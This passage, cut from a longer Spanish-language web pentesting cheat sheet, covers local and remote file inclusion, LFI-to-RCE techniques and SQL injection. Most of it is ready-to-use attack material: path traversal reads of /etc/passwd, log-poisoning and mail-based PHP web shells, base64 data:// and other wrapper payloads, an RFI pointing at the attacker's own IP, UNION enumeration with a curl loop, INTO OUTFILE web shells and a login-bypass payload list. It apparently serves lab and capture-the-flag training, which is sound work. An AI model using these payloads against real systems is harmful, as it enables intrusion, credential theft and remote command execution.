<span class="nv">$file</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;../&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
<span class="p">{</span>
  <span class="k">include</span><span class="p">(</span><span class="s2">&quot;lib/functions/</span><span class="si">$file</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>Petición malintencionada:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/var/www/html<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#curl --silent &quot;http://localhost/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/subgid&quot;</span>
s4vitar:100000:65536
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/var/www/html<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#curl --silent &quot;http://localhost/index.php?file=....//....//....//....//....//etc/subgid&quot;</span>
s4vitar:100000:65536
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/var/www/html<span class="o">]</span>
</code></pre></div>

<p><strong>Double encoding</strong></p>
<p>Para continuar evitando filtro, se puede hacer uso de una doble codificación. Esto es, codificamos los datos por primera vez:</p>
<div class="codehilite"><pre><span></span><code>%2E%2E%2Fetc%2Fpasswd
</code></pre></div>

<p>Y ahora codificamos el <strong>%</strong>:</p>
<div class="codehilite"><pre><span></span><code>%252E%252E%252Fetc%252Fpasswd
</code></pre></div>

<p><strong>Path Truncation</strong></p>
<p>Sobre la solicitud en la que pretendemos hacer <strong>LFI</strong>, añadimos mil veces <strong>./</strong> para el recurso <strong>../../../../etc/passwd/././././././&lt;...&gt;/.php</strong>. Una vez el nombre del archivo cuenta con más de 4.096 bytes, se elimina la parte más larga. De esta forma, nuestra petición se convierte en <strong>../../../../etc/passwd</strong>.</p>
<h4 id="rfi">RFI<a class="headerlink" href="#rfi" title="Permanent link">&para;</a></h4>
<p>Esta vulnerabilidad tiene cierta similitud que el LFI, sólo que la inclusión de archivos se produce de manera remota, permitiéndonos desde la URL vulnerable de un servicio web apuntar hacia servicios locales de nuestro equipo que estemos compartiendo.</p>
<p>Un buen ejemplo para practicar es la máquina <strong>TartarSauce</strong> de HackTheBox, donde el servicio web contaba con un plugin Gwolle vulnerable a RFI. Desde el servicio web, realizábamos la siguiente consulta desde la URL:</p>
<p><code>http://192.168.1.X/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abs
path=http://nuestraIP/wp-load.php</code></p>
<p>De esta forma, resulta sencillo pensar en lo fácil que puede llegar a ser para el caso descrito el acceso al sistema.</p>
<h4 id="lfi-to-rce">LFI to RCE<a class="headerlink" href="#lfi-to-rce" title="Permanent link">&para;</a></h4>
<p>Existen varias formas de conseguir ejecutar comandos en remoto a través de un <strong>Local File Inclusion</strong>, así como de acceder al sistema a través de la visualización de ciertos recursos. Para este caso, explicaré 2 técnicas a modo de ejemplo:</p>
<ul>
<li>Log Poisoning (access.log &amp; auth.log)</li>
<li>Mail PHP Execution</li>
</ul>
<p>La primera de ellas [<strong>Log Poisoning</strong>], consiste en verificar si las rutas <em>/var/log/auth.log</em> y <em>/var/log/apache2/access.log</em> son visibles desde el <strong>LFI</strong>.</p>
<p>En caso de serlo para la ruta <em>/var/log/auth.log</em>, podemos llevar a cabo técnicas de autenticación que nos permitan obtener ejecución de comandos en remoto. Esta ruta almacena las autenticaciones establecidas sobre el sistema, entre ellas además de las normales de sesión, las que van por SSH.</p>
<p>Esto en otras palabras se traduce en que por cada intento fallido de conexión por SSH hacia el sistema, se generará un reporte visible en el recurso <em>/var/log/auth.log</em>. La idea en este punto es aprovechar la visualización del recurso para forzar la autenticación de un usuario no convencional, donde incrustramos un código PHP que nos permite posteriormente desde el LFI ejecutar comandos sobre el sistema.</p>
<p>Ejemplo:</p>
<p><code>ssh "&lt;?php system('whoami'); ?&gt;"@192.168.1.X</code></p>
<p>Tras introducir una contraseña incorrecta para el usuario inexistente, se generará un reporte en el recurso <em>auth.log</em> como el siguiente:</p>
<div class="codehilite"><pre><span></span><code>Nov<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">11</span>:53:46<span class="w"> </span>parrot<span class="w"> </span>sshd<span class="o">[</span><span class="m">13626</span><span class="o">]</span>:<span class="w"> </span>Failed<span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>invalid<span class="w"> </span>user<span class="w"> </span>&lt;?php<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>system<span class="o">(</span><span class="s1">&#39;whoami&#39;</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>?&gt;<span class="w"> </span>from<span class="w"> </span>::1<span class="w"> </span>port<span class="w"> </span><span class="m">39988</span><span class="w"> </span>ssh2
Nov<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">11</span>:53:48<span class="w"> </span>parrot<span class="w"> </span>sshd<span class="o">[</span><span class="m">13626</span><span class="o">]</span>:<span class="w"> </span>Connection<span class="w"> </span>closed<span class="w"> </span>by<span class="w"> </span>invalid<span class="w"> </span>user<span class="w"> </span>&lt;?php<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>system<span class="o">(</span><span class="s1">&#39;whoami&#39;</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>?&gt;<span class="w"> </span>::1<span class="w"> </span>port<span class="w"> </span><span class="m">39988</span><span class="w"> </span><span class="o">[</span>preauth<span class="o">]</span>
</code></pre></div>

<p>Llegados a este punto, si desde la URL aprovechando el LFI apuntamos a dicho recurso, veremos cómo figurará un usuario '<strong><em>www-data</em></strong>' para el campo <em>whoami</em> definido en el script php incrustrado a través del usuario de autenticación.</p>
<p>Para el caso del recurso <em>access.log</em> pasa algo similar, sólo que en cuanto a la implementación técnica se realizarn otras operaciones.</p>
<p>Siempre suelo emplear Burpsuite como intermediario, pero también se puede hacer desde curl modificando el <strong>User-Agent</strong>. Lo que necesitamos hacer es realizar una consulta a la página web cambiando el User-Agent por un código PHP. De esta forma, tras visualizar el recurso <em>access.log</em> de Apache, veremos como el código PHP es interpretado en el User-Agent de la petición en la respuesta del lado del servidor, pudiendo posteriormente ejecutar comandos en remoto de la misma forma que sucedía con el recurso <em>auth.log</em>.</p>
<p>Otra de las técnicas para conseguir la ejecución de comandos a través de un <strong>LFI</strong> es por medio de archivos <strong>proc</strong>. Podemos encontrar la metodología paso a paso en el <a href="https://www.exploit-db.com/papers/12992/">siguiente recurso</a>.</p>
<p>La segunda de ellas [<strong>Mail PHP Execution</strong>], consiste en aprovechar la vulnerabilidad LFI para tras visualizar los usuarios en el recurso '<strong>/etc/passwd</strong>', poder visualizar sus correspondientes mails en '<strong>/var/mail/usuario</strong>'.</p>
<p>Es decir, suponiendo que tenemos nociones de que existe un usuario '<strong>www-data</strong>' sobre el sistema, en caso de contar con el servicio <strong>smtp</strong> corriendo, podemos "malformar" un mensaje para insertar código PHP y posteriormente apuntarlo desde el navegador.</p>
<p>En caso de no llegar a saber qué usuarios hay en el sistema, podemos hacer uso de la herramienta <strong>smtp-user-enum</strong> para enumerar usuarios sobre el servicio:</p>
<div class="codehilite"><pre><span></span><code>smtp-user-enum<span class="w"> </span>-M<span class="w"> </span>VRFY<span class="w"> </span>-U<span class="w"> </span>top_shortlist.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">192</span>.168.1.X<span class="w"> </span>
</code></pre></div>

<p>Obteniendo resultados similares al siguiente:</p>
<div class="codehilite"><pre><span></span><code><span class="m">192</span>.168.1.X:<span class="w"> </span>root<span class="w"> </span>exists
<span class="m">192</span>.168.1.X:<span class="w"> </span>mysql<span class="w"> </span>exists
<span class="m">192</span>.168.1.X:<span class="w"> </span>www-data<span class="w"> </span>exists
</code></pre></div>

<p>Ahora que sabemos que el usuario <strong>www-data</strong> existe, podemos hacer lo siguiente:</p>
<div class="codehilite"><pre><span></span><code>telnet<span class="w"> </span><span class="m">192</span>.168.1.X<span class="w"> </span><span class="m">25</span>

HELO<span class="w"> </span>localhost

MAIL<span class="w"> </span>FROM:&lt;root&gt;

RCPT<span class="w"> </span>TO:&lt;www-data&gt;

DATA

&lt;?php

<span class="nb">echo</span><span class="w"> </span>shell_exec<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span>
?&gt;
</code></pre></div>

<p>¿Qué tendremos que hacer llegados a este punto?, teniendo en cuenta que el mail ha sido enviado, tan sólo tendremos que hacer lo siguiente:</p>
<div class="codehilite"><pre><span></span><code>http://192.168.1.X/?page<span class="o">=</span>../../../../../var/mail/www-data?cmd<span class="o">=</span>comando-a-ejecutar
</code></pre></div>

<p>Y el navegador nos devolverá el output del comando aplicado a nivel de sistema.</p>
<h4 id="lfi-to-rce-via-php-sessions">LFI to RCE via PHP Sessions<a class="headerlink" href="#lfi-to-rce-via-php-sessions" title="Permanent link">&para;</a></h4>
<p>Para este caso, comprobamos si el sitio web cuenta usa <strong>PHP SESSION</strong> (<em>PHPSESSID</em>):</p>
<div class="codehilite"><pre><span></span><code>Set-Cookie:<span class="w"> </span><span class="nv">PHPSESSID</span><span class="o">=</span>i56kgbsq9rm8ndg3qbarhsbm27<span class="p">;</span><span class="w"> </span><span class="nv">path</span><span class="o">=</span>/
Set-Cookie:<span class="w"> </span><span class="nv">user</span><span class="o">=</span>admin<span class="p">;</span><span class="w"> </span><span class="nv">expires</span><span class="o">=</span>Mon,<span class="w"> </span><span class="m">13</span>-Aug-2018<span class="w"> </span><span class="m">20</span>:21:29<span class="w"> </span>GMT<span class="p">;</span><span class="w"> </span><span class="nv">path</span><span class="o">=</span>/<span class="p">;</span><span class="w"> </span>httponly
</code></pre></div>

<p>En PHP, estas sesiones son almacenadas en la ruta '<strong>/var/lib/php5/sess[PHPSESSID]</strong>':</p>
<div class="codehilite"><pre><span></span><code>/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip<span class="p">|</span>s:0:<span class="s2">&quot;&quot;</span><span class="p">;</span>loggedin<span class="p">|</span>s:0:<span class="s2">&quot;&quot;</span><span class="p">;</span>lang<span class="p">|</span>s:9:<span class="s2">&quot;en_us.php&quot;</span><span class="p">;</span>win_lin<span class="p">|</span>s:0:<span class="s2">&quot;&quot;</span><span class="p">;</span>user<span class="p">|</span>s:6:<span class="s2">&quot;admin&quot;</span><span class="p">;</span>pass<span class="p">|</span>s:6:<span class="s2">&quot;admin&quot;</span><span class="p">;</span>
</code></pre></div>

<p>La idea es setear la Cookie a <code>&lt;?php system('cat /etc/passwd');?&gt;</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="nv">login</span><span class="o">=</span><span class="m">1</span><span class="p">&amp;</span><span class="nv">user</span><span class="o">=</span>&lt;?php<span class="w"> </span>system<span class="o">(</span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="o">)</span><span class="p">;</span>?&gt;<span class="p">&amp;</span><span class="nv">pass</span><span class="o">=</span>password<span class="p">&amp;</span><span class="nv">lang</span><span class="o">=</span>en_us.php
</code></pre></div>

<p>Una vez hecho, podemos incluir el archivo PHP de la siguiente forma a través del LFI:</p>
<div class="codehilite"><pre><span></span><code><span class="nv">login</span><span class="o">=</span><span class="m">1</span><span class="p">&amp;</span><span class="nv">user</span><span class="o">=</span>admin<span class="p">&amp;</span><span class="nv">pass</span><span class="o">=</span>password<span class="p">&amp;</span><span class="nv">lang</span><span class="o">=</span>/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
</code></pre></div>

<h4 id="lfi-to-rce-via-environ">LFI to RCE via Environ<a class="headerlink" href="#lfi-to-rce-via-environ" title="Permanent link">&para;</a></h4>
<p>Si por algún casual podemos visualizar el recurso <strong>/proc/self/environ</strong>, como si se tratara de un recurso log, enviaremos nuestro Payload en el User-Agent:</p>
<div class="codehilite"><pre><span></span><code>GET<span class="w"> </span>vulnerable.php?filename<span class="o">=</span>../../../proc/self/environ<span class="w"> </span>HTTP/1.1
User-Agent:<span class="w"> </span>&lt;?<span class="o">=</span>phpinfo<span class="o">()</span><span class="p">;</span><span class="w"> </span>?&gt;
</code></pre></div>

<h4 id="lfi-rfi-using-wrappers">LFI RFI Using Wrappers<a class="headerlink" href="#lfi-rfi-using-wrappers" title="Permanent link">&para;</a></h4>
<h5 id="wrapper-phpfilter">Wrapper php://filter<a class="headerlink" href="#wrapper-phpfilter" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code>http://example.com/index.php?page<span class="o">=</span>php://filter/read<span class="o">=</span>string.rot13/resource<span class="o">=</span>index.php
http://example.com/index.php?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>index.php
http://example.com/index.php?page<span class="o">=</span>pHp://FilTer/convert.base64-encode/resource<span class="o">=</span>index.php
</code></pre></div>

<p>Se puede jugar con otro wrapper de compresión en caso de contar con un archivo muy grande:</p>
<div class="codehilite"><pre><span></span><code>http://example.com/index.php?page<span class="o">=</span>php://filter/zlib.deflate/convert.base64-encode/resource<span class="o">=</span>/etc/passwd
</code></pre></div>

<p>Así mismo, los wrappers también pueden ser encadenados:</p>
<div class="codehilite"><pre><span></span><code>php://filter/convert.base64-decode<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-decode/resource<span class="o">=</span>%s
</code></pre></div>

<h5 id="wrapper-zip">Wrapper zip://<a class="headerlink" href="#wrapper-zip" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;pre&gt;&lt;?php system(</span><span class="nv">$_GET</span><span class="s2">[&#39;cmd&#39;]); ?&gt;&lt;/pre&gt;&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>payload.php<span class="p">;</span><span class="w">  </span>
zip<span class="w"> </span>payload.zip<span class="w"> </span>payload.php<span class="p">;</span>
mv<span class="w"> </span>payload.zip<span class="w"> </span>shell.jpg<span class="p">;</span>
rm<span class="w"> </span>payload.php

http://example.com/index.php?page<span class="o">=</span>zip://shell.jpg%23payload.php
</code></pre></div>

<h5 id="wrapper-data">Wrapper data://<a class="headerlink" href="#wrapper-data" title="Permanent link">&para;</a></h5>
<p>Este Wrapper nos permite ejecutar directamente código PHP:</p>
<div class="codehilite"><pre><span></span><code>http://example.net/?page<span class="o">=</span>data://text/plain<span class="p">;</span>base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4<span class="o">=</span>
NOTA:<span class="w"> </span>El<span class="w"> </span>payload<span class="w"> </span>es<span class="w"> </span><span class="s2">&quot;&lt;?php system(</span><span class="nv">$_GET</span><span class="s2">[&#39;cmd&#39;]);echo &#39;Tenemos Shell!&#39;; ?&gt;&quot;</span>
</code></pre></div>

<p>Otra forma:</p>
<div class="codehilite"><pre><span></span><code>http://example.com/index.php?file<span class="o">=</span>data:text/plain<span class="p">;</span>,&lt;?php<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>shell_exec<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span>?&gt;
</code></pre></div>

<p>Otro payload interesante a tener en cuenta es el <code>&lt;?php phpinfo(); die();?&gt;</code>. La funcionalidad <strong>die</strong> previene la ejecución del resto del script o la ejecución de la extensión decodificada incorrectamente anexada a la secuencia.</p>
<p>Para ejecutar en ambos casos directamente un comando, la solicitud de datos + carga útil puede ser:</p>
<div class="codehilite"><pre><span></span><code>http://example.com/index.php?file<span class="o">=</span>data:,&lt;?system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;x&#39;</span><span class="o">])</span><span class="p">;</span>?&gt;<span class="p">&amp;</span><span class="nv">x</span><span class="o">=</span>ls
</code></pre></div>

<p>O también:</p>
<div class="codehilite"><pre><span></span><code>http://example.com/index.php?file<span class="o">=</span>data:<span class="p">;</span>base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4<span class="o">=</span><span class="p">&amp;</span><span class="nv">x</span><span class="o">=</span>ls.
</code></pre></div>

<h5 id="wrapper-expect">Wrapper expect://<a class="headerlink" href="#wrapper-expect" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code>http://example.com/index.php?page<span class="o">=</span>expect://id
http://example.com/index.php?page<span class="o">=</span>expect://ls
</code></pre></div>

<h5 id="wrapper-input">Wrapper input://<a class="headerlink" href="#wrapper-input" title="Permanent link">&para;</a></h5>
<p>Especificamos nuestro payload a través de un parámetro POST:</p>
<div class="codehilite"><pre><span></span><code>http://example.com/index.php?page<span class="o">=</span>php://input
POST<span class="w"> </span>DATA:<span class="w"> </span>&lt;?<span class="w"> </span>system<span class="o">(</span><span class="s1">&#39;id&#39;</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>?&gt;
</code></pre></div>

<p>También puede hacerse desde terminal de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;? system(&#39;id&#39;); ?&gt;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>POST<span class="w"> </span>http://example.com/index.php?page<span class="o">=</span>php://input
</code></pre></div>

<h5 id="wrapper-phar">Wrapper phar://<a class="headerlink" href="#wrapper-phar" title="Permanent link">&para;</a></h5>
<p>Crea un archivo <strong>phar</strong> con un objeto serializado en sus metadatos:</p>
<div class="codehilite"><pre><span></span><code>//<span class="w"> </span>create<span class="w"> </span>new<span class="w"> </span>Phar
<span class="nv">$phar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>Phar<span class="o">(</span><span class="s1">&#39;test.phar&#39;</span><span class="o">)</span><span class="p">;</span>
<span class="nv">$phar</span>-&gt;startBuffering<span class="o">()</span><span class="p">;</span>
<span class="nv">$phar</span>-&gt;addFromString<span class="o">(</span><span class="s1">&#39;test.txt&#39;</span>,<span class="w"> </span><span class="s1">&#39;text&#39;</span><span class="o">)</span><span class="p">;</span>
<span class="nv">$phar</span>-&gt;setStub<span class="o">(</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;</span><span class="o">)</span><span class="p">;</span>

//<span class="w"> </span>add<span class="w"> </span>object<span class="w"> </span>of<span class="w"> </span>any<span class="w"> </span>class<span class="w"> </span>as<span class="w"> </span>meta<span class="w"> </span>data
class<span class="w"> </span>AnyClass<span class="w"> </span><span class="o">{}</span>
<span class="nv">$object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>AnyClass<span class="p">;</span>
<span class="nv">$object</span>-&gt;data<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;rips&#39;</span><span class="p">;</span>
<span class="nv">$phar</span>-&gt;setMetadata<span class="o">(</span><span class="nv">$object</span><span class="o">)</span><span class="p">;</span>
<span class="nv">$phar</span>-&gt;stopBuffering<span class="o">()</span><span class="p">;</span>
</code></pre></div>

<p>Si llegados a este punto, cualquier operación es realizada en nuestro archivo Phar existente haciendo uso del wrapper <strong>phar://</strong>, entonces los metadatos serializados son deserializados y por tanto interpretados.</p>
<p>Si esta aplicación contase con una clase llamada <strong>AnyClass</strong> y tuviese los métodos mágicos <strong>__destruct()</strong> o <strong>__wakeup()</strong> definidos, entonces estos serían invocados automáticamente:</p>
<div class="codehilite"><pre><span></span><code>class<span class="w"> </span>AnyClass<span class="w"> </span><span class="o">{</span>
<span class="w">    </span><span class="k">function</span><span class="w"> </span>__destruct<span class="o">()</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$this</span>-&gt;data<span class="p">;</span>
<span class="w">    </span><span class="o">}</span>
<span class="o">}</span>
//<span class="w"> </span>output:<span class="w"> </span>rips
include<span class="o">(</span><span class="s1">&#39;phar://test.phar&#39;</span><span class="o">)</span><span class="p">;</span>
</code></pre></div>

<h4 id="sqli">SQLI<a class="headerlink" href="#sqli" title="Permanent link">&para;</a></h4>
<p>Ejemplo básico aplicado sobre servicio web falso http://www.paginaweb.com/contenidos.php?Id=3</p>
<p>Comprobamos que la web es vulnerable a inyección SQL:</p>
<p><code>http://www.paginaweb.com/contenidos.php?Id=-1</code></p>
<p>Enumeramos hasta coincidir con el número de columnas para generar las etiquetas:</p>
<p><code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,2,3,4,5-- -</code></p>
<p>Nos aprovechamos de las etiquetas generadas para ver si somos capaces de visualizar archivos sobre el sistema, así como para saber el versionado del servicio de base de datos y el usuario que corre dicho servicio:</p>
<p><code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,select_file('/etc/passwd'),3,4,5-- -</code>
<code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,@@version,3,4,5-- -</code>
<code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,user(),3,4,5-- -</code></p>
<p>Comenzamos a enumerar las tablas de la base de datos:</p>
<p><code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+0,1-- -</code></p>
<p>Nos montamos un script en <strong>Bash</strong> (o en otro lenguaje) para determinar de forma rápida qué tablas existen sobre la base de datos, parseando para ello los resultados en función del caso que se nos presente:</p>
<div class="codehilite"><pre><span></span><code><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">200</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;Para el número </span><span class="nv">$i</span><span class="s2">: &quot;</span>
<span class="w">    </span>curl<span class="w"> </span>--silent<span class="w"> </span><span class="s2">&quot;http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+</span><span class="nv">$i</span><span class="s2">,1--%20-&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;eltitulo&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;&gt;&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $1}&#39;</span><span class="w"> </span><span class="nv">FS</span><span class="o">=</span><span class="s2">&quot;&lt;&quot;</span>
<span class="k">done</span>
</code></pre></div>

<p>Obteniendo resultados como los siguientes:</p>
<div class="codehilite"><pre><span></span><code>Para<span class="w"> </span>el<span class="w"> </span>número<span class="w"> </span><span class="m">63</span>:<span class="w"> </span>CABECERA
Para<span class="w"> </span>el<span class="w"> </span>número<span class="w"> </span><span class="m">64</span>:<span class="w"> </span>COLABORADORES
Para<span class="w"> </span>el<span class="w"> </span>número<span class="w"> </span><span class="m">65</span>:<span class="w"> </span>CONTENIDOS
Para<span class="w"> </span>el<span class="w"> </span>número<span class="w"> </span><span class="m">66</span>:<span class="w"> </span>DOCUMENTOS
Para<span class="w"> </span>el<span class="w"> </span>número<span class="w"> </span><span class="m">67</span>:<span class="w"> </span>HORARIOS
Para<span class="w"> </span>el<span class="w"> </span>número<span class="w"> </span><span class="m">68</span>:<span class="w"> </span>IDIOMAS
Para<span class="w"> </span>el<span class="w"> </span>número<span class="w"> </span><span class="m">69</span>:<span class="w"> </span>IMAGENES
Para<span class="w"> </span>el<span class="w"> </span>número<span class="w"> </span><span class="m">70</span>:<span class="w"> </span>MODULOS
Para<span class="w"> </span>el<span class="w"> </span>número<span class="w"> </span><span class="m">71</span>:<span class="w"> </span>NOTICIAS
Para<span class="w"> </span>el<span class="w"> </span>número<span class="w"> </span><span class="m">72</span>:<span class="w"> </span>PERMISOS
Para<span class="w"> </span>el<span class="w"> </span>número<span class="w"> </span><span class="m">73</span>:<span class="w"> </span>USUARIOS
</code></pre></div>

<p>Una vez localizada la tabla que nos interese (para este caso, la tabla <strong>usuarios</strong>), enumeramos las columnas existentes para dicha tabla en la base de datos:</p>
<p><code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_name=char(117,115,117,97,114,105,111,115)-- -</code></p>
<p>Es necesario para este paso convertir la cadena <strong>usuarios</strong> de STRING a formato ASCII. Obtendremos los siguientes resultados:</p>
<p><code>IDUSUARIO,IDEMPRESA,USUARIO,PASSWORD,NOMBRE,ADMINISTRADOR</code></p>
<p>Una vez sabiendo los nombres de las columnas, aprovechamos la funcionalidad <em>group_concat</em> para concatenar todas las columnas cuyos datos queramos visualizar:</p>
<p><code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(usuario,0x3a,password),3,4,5+from+usuarios--%20-</code></p>
<p>Obteniendo el usuario y contraseña de acceso.</p>
<p>Antes de complicarse, preferible probar inyecciones básicas sobre paneles de autenticación, esto es:</p>
<div class="codehilite"><pre><span></span><code>Usuario:<span class="w"> </span>admin<span class="s1">&#39; or 1=1-- -</span>
<span class="s1">Password: admin&#39;</span><span class="w"> </span>or<span class="w"> </span><span class="nv">1</span><span class="o">=</span><span class="m">1</span>--<span class="w"> </span>-
</code></pre></div>

<p>Para casos donde podamos llevar a cabo un nuevo registro de usuario, otra vía es crear un usuario con nombre <strong>admin' or 1=1-- -</strong> y password <strong>admin' or 1=1-- -</strong>, de esta forma tras posteriormente realizar la autenticación como usuario válido, tendremos acceso a todos los datos de los usuarios en la base de datos principal.</p>
<p>Para técnicas de bypassing consultar el siguiente <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF">enlace</a></p>
<p>En caso de querer ejecutar comandos sobre el sistema, podemos aprovechar que desde consultas <strong>sql</strong> se pueden exportar archivos para generar el nuestro malicioso. Para ello, aplicaríamos la siguiente sintaxis a modo de ejemplo:</p>
<div class="codehilite"><pre><span></span><code>http://example.com/photoalbum.php?id<span class="o">=</span><span class="m">1</span><span class="w"> </span>union<span class="w"> </span>all<span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="m">1</span>,2,3,4,<span class="s2">&quot;&lt;?php echo</span>
<span class="s2">shell_exec(</span><span class="nv">$_GET</span><span class="s2">[&#39;cmd&#39;]);?&gt;&quot;</span>,6,7,8,9<span class="w"> </span>into<span class="w"> </span>OUTFILE<span class="w"> </span><span class="s1">&#39;c:/xampp/htdocs/cmd.php&#39;</span>

http://example.com/photoalbum.php?id<span class="o">=</span><span class="m">1</span><span class="w"> </span>union<span class="w"> </span>all<span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="m">1</span>,2,3,4,<span class="s2">&quot;&lt;?php echo</span>
<span class="s2">shell_exec(</span><span class="nv">$_GET</span><span class="s2">[&#39;cmd&#39;]);?&gt;&quot;</span>,6,7,8,9<span class="w"> </span>into<span class="w"> </span>OUTFILE<span class="w"> </span><span class="s1">&#39;/var/www/html/cmd.php&#39;</span>
</code></pre></div>

<p>A continuación, un Payload de pruebas a realizar para los logins una vez hagamos la convencional <strong>' or '1'='1</strong>:</p>
<div class="codehilite"><pre><span></span><code>-<span class="s1">&#39;</span>
<span class="s1">&#39;</span><span class="w"> </span><span class="s1">&#39;</span>
<span class="s1">&#39;</span><span class="p">&amp;</span><span class="s1">&#39;</span>
<span class="s1">&#39;</span>^<span class="s1">&#39;</span>
<span class="s1">&#39;</span>*<span class="s1">&#39;</span>
<span class="s1">&#39;</span><span class="w"> </span>or<span class="w"> </span><span class="s1">&#39;&#39;</span>-<span class="s1">&#39;</span>
<span class="s1">&#39;</span><span class="w"> </span>or<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="s1">&#39;</span>
<span class="s1">&#39;</span><span class="w"> </span>or<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">&amp;</span><span class="s1">&#39;</span>
<span class="s1">&#39;</span><span class="w"> </span>or<span class="w"> </span><span class="s1">&#39;&#39;</span>^<span class="s1">&#39;</span>
<span class="s1">&#39;</span><span class="w"> </span>or<span class="w"> </span><span class="s1">&#39;&#39;</span>*<span class="s1">&#39;</span>
<span class="s1">&quot;-&quot;</span>
<span class="s1">&quot; &quot;</span>
<span class="s1">&quot;&amp;&quot;</span>
<span class="s1">&quot;^&quot;</span>
<span class="s1">&quot;*&quot;</span>
<span class="s1">&quot; or &quot;&quot;-&quot;</span>
<span class="s1">&quot; or &quot;&quot; &quot;</span>
<span class="s1">&quot; or &quot;&quot;&amp;&quot;</span>
<span class="s1">&quot; or &quot;&quot;^&quot;</span>
<span class="s1">&quot; or &quot;&quot;*&quot;</span>
<span class="s1">or true--</span>
<span class="s1">&quot; or true--</span>
<span class="s1">&#39;</span><span class="w"> </span>or<span class="w"> </span>true--
<span class="s2">&quot;) or true--</span>
<span class="s2">&#39;) or true--</span>
<span class="s2">&#39; or &#39;x&#39;=&#39;x</span>
<span class="s2">&#39;) or (&#39;x&#39;)=(&#39;x</span>
<span class="s2">&#39;)) or ((&#39;x&#39;))=((&#39;x</span>
<span class="s2">&quot;</span><span class="w"> </span>or<span class="w"> </span><span class="s2">&quot;x&quot;</span><span class="o">=</span><span class="s2">&quot;x</span>
